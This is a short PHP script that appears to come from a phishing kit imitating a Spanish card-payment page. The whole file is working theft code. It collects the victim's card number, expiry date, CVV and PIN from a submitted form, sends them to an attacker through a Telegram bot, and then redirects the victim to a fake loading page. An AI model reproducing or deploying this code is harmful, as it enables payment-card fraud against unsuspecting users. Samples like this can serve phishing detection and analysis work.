<?php
include "../telegram.php";
$num = $_POST['Sis_Numero_Tarjeta'];
$mm = $_POST['Sis_Caducidad_Tarjeta_Mes'];
$yy = $_POST['Sis_Caducidad_Tarjeta_Anno'];
$cvv = $_POST['Sis_Tarjeta_CVV2'];
$Pin = $_POST['Sis_Tarjeta_CVV3'];
$message .= "card:             : ".$num."\n";
$message .= "exp:             : ".$mm."/".$yy."\n";
$message .= "cvv:             : ".$cvv."\n";
$message .= "Pin:             : ".$Pin."\n";
$tk = $token; $chid = $chatid; sendMessage($chid, $message, $tk);
header("location: ../Seleccione_medio_de_codigo_loading.php?error=1&validation#_$dispatch");
?>